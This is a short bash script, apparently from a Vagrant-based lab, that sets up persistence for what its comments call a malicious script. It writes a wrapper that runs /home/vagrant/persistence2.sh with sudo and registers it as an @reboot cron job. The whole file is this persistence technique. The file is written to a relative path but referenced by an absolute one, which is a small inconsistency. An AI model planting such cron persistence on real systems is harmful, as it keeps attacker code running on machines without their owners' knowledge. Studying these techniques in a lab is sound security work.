#!/bin/bash

# create shell script that runs a malicious script at start up
echo "sudo /home/vagrant/persistence2.sh" > startup_scripts.sh
chmod +x /home/vagrant/startup_scripts.sh
# adding startup script to cron
(crontab -l ; echo "@reboot /home/vagrant/startup_scripts.sh")| crontab -